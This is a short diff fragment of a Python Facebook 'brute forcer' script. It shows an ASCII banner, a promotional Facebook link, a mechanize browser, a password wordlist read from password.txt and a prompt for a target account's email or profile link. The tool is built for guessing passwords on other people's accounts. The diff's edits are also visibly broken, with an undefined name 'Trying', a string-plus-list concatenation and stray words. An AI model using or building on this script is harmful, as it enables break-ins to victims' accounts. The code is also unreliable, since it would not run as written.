@@ -30,7 +30,7 @@ print('\033[1;32m| __| | _ )   | _ ) | _ \ | | | | |_   _| | __|   \ \ / / | __|
 print('\033[1;32m| _|  | _ \   | _ \ |   / | |_| |   | |   | _|     \ V /  | _|  |   /    / /   _    / /\033[1;31m') 
 print('\033[1;32m|_|   |___/   |___/ |_|_\  \___/    |_|   |___|     \_/   |___| |_|_\   /___| (_)  /_/\033[1;31m')
 print('FOLLOW US ON FB:www.facebook.com/cyberhacks6')
-file=open('password.txt','r')
+file=open('password.txt')
 
 web = mechanize.Browser()
 
@@ -40,11 +40,9 @@ def login( email, password):
 email = input("INPUT TARGET ACCOUNT MAIL/PROFILE LINK:")
 print(" TARGET MAIL /PROF LINK:",email+"")
 
-i=0
-while file:
-    file.readline()
-    i=+1
-    print(file)
+content = file.readlines()
+X = Trying
+print(X + content)
 excepthandler
 
 ConnectionError
